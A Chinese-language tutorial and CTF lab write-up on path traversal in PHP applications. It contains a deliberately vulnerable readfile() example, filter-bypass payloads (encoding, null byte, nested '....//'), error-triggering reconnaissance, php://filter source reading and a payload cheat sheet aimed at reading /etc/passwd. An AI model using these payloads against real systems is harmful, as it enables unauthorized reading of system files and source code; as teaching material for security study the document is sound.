## 一句话概括

**路径遍历（Path Traversal）的核心是：利用操作系统的路径解析规则，通过输入 `../` 这样的字符序列，让应用在访问文件时跳出预期目录。** `../../../etc/passwd` 就是它的经典载荷。

## 原理

### 1. 为什么 `../` 能让程序跑到目录外面

在几乎所有操作系统中：

- `.` 表示当前目录；
- `..` 表示上一级目录；
- `/`（Linux/Unix/macOS）或 `\`（Windows）是路径分隔符。

关键点在于：**应用程序拼接出的路径，最终会原封不动交给操作系统内核的文件系统去解析**。文件系统只认规则、不认「这个路径是程序拼出来的、不应该允许」，遇到 `..` 就老老实实向上跳一级。于是：

```text
程序员以为的路径：  /var/www/html/files/ + welcome.txt
                                  ↓
                     /var/www/html/files/welcome.txt   ← 合法

攻击者传入的路径：  /var/www/html/files/ + ../../../../etc/passwd
                                  ↓
文件系统逐段解析：  /var/www/html/files/ → /var/www/html/ → /var/www/
                    → /var/ → /（根） → /etc/passwd       ← 越界
```

**漏洞的根因不是「文件系统有问题」，而是「应用把用户输入当成了路径的一部分，且没有做归一化校验」。**

### 2. 完整实现步骤拆解

#### 场景设定

假设一个网站用于显示静态页面：

```http
GET /load.php?filename=welcome.txt HTTP/1.1
Host: example.com
```

后端 PHP 代码：

```php
<?php
$file = $_GET['filename']; // 用户直接控制这个参数
$base_path = '/var/www/html/files/';

// 程序员的意图：读取 /var/www/html/files/welcome.txt
readfile($base_path . $file);
?>
```

#### 第一步：理解程序的正常逻辑

请求 `?filename=welcome.txt` 时，程序拼接出：

```text
/var/www/html/files/ + welcome.txt = /var/www/html/files/welcome.txt
```

这是合法路径，文件被正确读取并返回。

#### 第二步：发现漏洞点

攻击者发现 `filename` **用户可控**，且程序**没有对该参数做任何过滤**，直接拼到基础路径后面 —— 这就是漏洞点。

#### 第三步：构造遍历 Payload

目标是读 `/etc/passwd`。先算**相对位置**：从 `/var/www/html/files/` 回到根目录 `/` 需要几级 `../`？

```text
../           → /var/www/html/
../../        → /var/www/
../../../     → /var/
../../../../  → /
```

于是：

```text
filename = ../../../../etc/passwd
```

#### 第四步：文件系统解析路径（最关键的一步）

程序把拼接结果交给操作系统内核的文件系统：

```text
起始目录：/var/www/html/files/
解析 ../  → /var/www/html/
解析 ../  → /var/www/
解析 ../  → /var/
解析 ../  → /            （根目录）
拼接剩余：  / + etc/passwd = /etc/passwd
```

文件系统成功打开 `/etc/passwd` 并返回内容，**漏洞利用成功**。

> **`../` 的数量不必精确**。多写几级也没关系 —— 到了根目录之后，再多的 `../` 仍然停在根目录（`/..` 就是 `/`）。所以实战里直接用 `../../../../../../etc/passwd` 这种「管它几级先怼上去」的写法很常见。真正需要精确时，才用探测法确定层数。

### 3. 常见绕过手法

攻击者会根据不同的过滤情况调整 Payload：

**1. 绕过简单的后缀拼接（空字节截断）**

- **场景**：代码是 `include($file . '.php')`，程序员想固定后缀。
- **Payload**：`../../../etc/passwd%00`
- **原理**：在旧版 PHP（< 5.3.4）中，`%00`（空字符）被解析为字符串结束符。拼接后路径为 `/var/www/html/files/../../../etc/passwd%00.php`，系统遇到 `%00` 时认为路径已结束，从而成功包含 `/etc/passwd`，忽略了后面的 `.php`。

**2. Windows 系统下的遍历**

- **特点**：Windows 使用 `\` 作为分隔符，但也兼容 `/`。同时，盘符（如 `C:`）是关键。
- **Payload**：`....\\....\\....\\windows\\system32\\drivers\\etc\\hosts` 或使用 `/`
- **绝对路径利用**：如果程序没有任何过滤，甚至可以直接用绝对路径 `C:\\windows\\system32\\drivers\\etc\\hosts`

**3. 编码绕过**

- **场景**：程序可能会过滤 `../` 字符串，但检查发生在解码**之前**。
- **Payload**：使用 URL 编码、双重 URL 编码
  - `../` → `%2e%2e%2f`（URL 编码）
  - `../` → `%252e%252e%252f`（双重 URL 编码：`%2e` 本身的 `%` 被编码成了 `%25`）
- **原理**：如果 Web 服务器或应用框架在把参数交给 PHP 之前**自动做了一次 URL 解码**，而安全检查代码运行在**解码之后**，那么攻击者通过双重编码就能绕过过滤。最终 `%252e%252e%252f` 先被解成 `%2e%2e%2f`，再被解成 `../`。

**4. 使用非标准编码**

- **Payload**：`..%c0%af`（UTF-8 Unicode 编码形式的 `/`）
- **原理**：利用解析器在 Unicode 解码和路径解析顺序上的差异，在特定的 Web 容器或解析器漏洞中绕过。（这种通常属于**特定环境的漏洞**，而非通用方法）

**5. 过滤不彻底时的变形**

- **Payload**：`....//....//....//etc/passwd`
- **原理**：很多过滤是「见到 `../` 就删掉」。输入 `....//` 被删掉中间的 `../` 之后，剩下的字符**重新拼成了 `../`**，过滤反而帮了攻击者。

### 6. 黑盒下怎么知道后端路径长什么样

> **原始追问**：`/var/www/html/files/` 我怎么知道后端代码是这样的？

这是 Web 安全测试的关键环节：**如何通过黑盒测试（不知道后端代码）推断后端逻辑**。你无法 100% 确定，但可以通过一系列方法做**高精度推测**。

#### 方法 1：基于常见部署惯例推测

- **Linux**：Web 根目录通常是 `/var/www/html/`、`/var/www/`、`/home/www/` 或 `/usr/share/nginx/html/`
- **Windows**：通常是 `C:\inetpub\wwwroot\`
- **静态资源**：网站常有 `files/`、`downloads/`、`assets/`、`images/` 之类的目录

看到 `http://example.com/downloads/file.pdf`，可以合理推测物理路径是 `/var/www/html/downloads/file.pdf`。

#### 方法 2：利用错误信息获取路径（最直接）

**故意触发错误**是获取内部信息的神技。

- **方法**：提供一个无效或畸形的参数，让后端处理失败
- **示例**：`http://example.com/load.php?filename=../../../nonexistent_file_12345`
- **理想结果**：

```text
Warning: readfile(/var/www/html/files/../../../nonexistent_file_12345):
failed to open stream: No such file or directory in /var/www/html/load.php on line 5
```

**恭喜！** 你现在直接获得了完整的后端路径：`/var/www/html/files/` 和脚本位置 `/var/www/html/load.php`。这个错误信息证实了你的假设。

#### 方法 3：用通用 Payload 模糊测试

**原理**：尝试包含一个**已知存在且内容唯一**的系统文件，靠响应差异判断。

- **经典探测文件**：
  - **Linux**：`/etc/passwd` —— 肯定存在，且含 `root:x:0:0` 这样的独特字符串
  - **Windows**：`c:\windows\system32\drivers\etc\hosts` —— 也存在，通常含 `127.0.0.1`
- **测试过程**：
  1. 请求 `?filename=../../../../etc/passwd`
  2. 观察响应
     - **响应变长**且能找到 `root:x:0:0` → 不仅确认漏洞存在，还**间接证实基础路径猜对了**（错误路径会导致找不到文件、返回错误或空内容）
     - **返回「文件未找到」** → 调整 `../` 数量，如 `../../../../../etc/passwd`。这个过程就是通过「盲打」探测深度。

#### 方法 4：用应用自身的文件当「探针」

不去猜系统文件，而是去包含一个**你知道肯定在 Web 目录里的文件**。

- **探针文件怎么找**：网站主页 `index.php`；网页源码里的静态资源（如 `<img src="/images/logo.png">`）；配置文件 `config.php`
- **操作过程**：
  1. 网页源码里看到 `<img src="/images/logo.png">`
  2. 推测物理路径是 `/var/www/html/images/logo.png`
  3. 请求 `?filename=../../images/logo.png`
  4. 如果返回了一张图片（检查 `Content-Type: image/png`），就**强力证明**了：漏洞存在、基础路径猜测正确、从 `files` 到 `images` 需要向上跳两级

#### 方法 5：用 PHP 包装器读源码（终极武器）

如果目标是 PHP 且存在文件包含漏洞，`php://filter` 是获取信息的瑞士军刀，它甚至可以**在没有 RFI 和代码执行的情况下直接读取 PHP 文件的源代码**。

```http
GET /load.php?filename=php://filter/convert.base64-encode/resource=index HTTP/1.1
Host: 靶机地址
```

这个 Payload 告诉 PHP：「请读取 `index.php`（这里会拼接基础路径），但不要执行它，而是用 Base64 编码后输出。」

## 本题情景与解题手法

### 题目形态

靶场上有一个形如 `http://靶机地址/aa__^^.php?filename=./index.php` 的页面，参数 `filename` 明显在指定要读的文件。**拿到 `filename` 参数的第一步就是试路径遍历。**

### 第一步：先确认参数真的能读文件

```http
GET /aa__^^.php?filename=./index.php HTTP/1.1
Host: 靶机地址
```

能读到当前文件内容 → 参数可用，进入下一步。

### 第二步：用「越读越远」的路径试探边界

```http
GET /aa__^^.php?filename=.. HTTP/1.1        # 上级目录（2 字符）
GET /aa__^^.php?filename=. HTTP/1.1         # 当前目录（1 字符）
GET /aa__^^.php?filename=/ HTTP/1.1         # 根目录（1 字符）
```

### 第三步：挑「短路径」目标，省字符也省心

比 `/etc/passwd` 更短的路径在受限场景（长度/字符过滤）里更好用：

**极短路径（1-6 字符）：**

```text
?filename=/        # 根目录（1字符）
?filename=.        # 当前目录（1字符）
?filename=..       # 上级目录（2字符）
?filename=/bin     # 二进制目录（4字符）
?filename=/tmp     # 临时目录（4字符）
?filename=/var     # 变量数据（4字符）
?filename=/etc     # 配置目录（4字符）
?filename=/usr     # 用户程序（4字符）
?filename=/home    # 用户目录（5字符）
?filename=/root    # root 目录（5字符）
?filename=/proc    # 进程信息（5字符）
```

**短系统文件（<10 字符）：**

```text
?filename=/etc/issue      # 系统信息（10字符）
?filename=/etc/hosts      # 主机文件（10字符）
?filename=/proc/version   # 内核版本（15字符）
?filename=/proc/self/exe  # 当前进程（15字符）
```

### 第四步：为什么不能直接列出目录

> **原始追问**：我想让它输出目录不行吗？

**很遗憾，`readfile()` 函数本身不能直接输出目录列表**，这是 PHP 的设计限制。

- `readfile()` 的设计是：
  - 读取**文件内容**并直接输出
  - **不能读取目录**（会报 `Is a directory` 错误）
  - **不能列出目录内容**

**那怎么知道目录里有什么？** 三条路：

1. **换函数**：能进到目录列举的是 `scandir()` / `glob()` / `opendir()`，得看题目代码用的是什么；
2. **用已知文件名猜**：`index.php`、`config.php`、`flag.php` 这类高频名逐个试；
3. **换漏洞类型**：如果目标是 PHP 且存在文件包含，用 `php://filter` 读源码，而不是试图列目录。

### 解题手法一句话总结

> **`filename` 可控** → 用 `./` 确认能读 → 用 `..` / `/` 试目录边界 → 用短路径逐个试系统文件 → 读不到目录就改成猜文件名或换 `php://filter` → 目标明确后直接 `?filename=../../../../etc/passwd`。

## 利用条件

1. **存在可控的文件路径参数**：`?page=`、`?filename=`、`?file=`、`?path=` 这类；
2. **参数被直接拼接进文件操作**：`readfile()`、`file_get_contents()`、`include()`、`fopen()`；
3. **没有做归一化校验**：即没有 `realpath()` 后判断前缀，也没有白名单；
4. **进程对目标文件有读权限**：`/etc/shadow` 通常读不到（权限 600），`/etc/passwd` 一般可以；
5. **没有被 `open_basedir` 限制**：这是 PHP 层面最硬的限制。

## Payload 速查

| 目的 | Payload |
| :--- | :--- |
| 基础遍历 | `?filename=../../../../etc/passwd` |
| 多写几级（无脑兜底） | `?filename=../../../../../../../../etc/passwd` |
| URL 编码绕过 | `?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| 双重 URL 编码 | `?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd` |
| 嵌套变形绕过 | `?filename=....//....//....//etc/passwd` |
| 绝对路径直给 | `?filename=/etc/passwd` |
| 空字节截断（PHP < 5.3.4） | `?filename=../../../etc/passwd%00` |
| Windows 目标 | `?filename=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts` |
| 读源码（含 PHP 环境） | `?filename=php://filter/convert.base64-encode/resource=index.php` |
| 读请求体 | `?filename=php://input` |

## 完整示例

从探测到得手的完整过程：

**1. 判断是否存在遍历**

```http
GET /load.php?filename=../../../nonexistent_file_12345 HTTP/1.1
Host: 靶机地址
```

响应里若能报出完整路径，就直接拿到了基础目录。

**2. 用探针文件验证深度**

```http
GET /load.php?filename=../../images/logo.png HTTP/1.1
Host: 靶机地址
```

返回 `Content-Type: image/png` → 基础路径与层数都猜对了。

**3. 读目标文件**

```http
GET /load.php?filename=../../../../etc/passwd HTTP/1.1
Host: 靶机地址
```

响应：

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**4. 绕过滤（如果第 3 步被拦）**

```http
GET /load.php?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: 靶机地址
```

**5. 读源码（如果是 PHP 且需要源码）**

```http
GET /load.php?filename=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: 靶机地址
```

对响应里的 Base64 串解码即得明文源码。
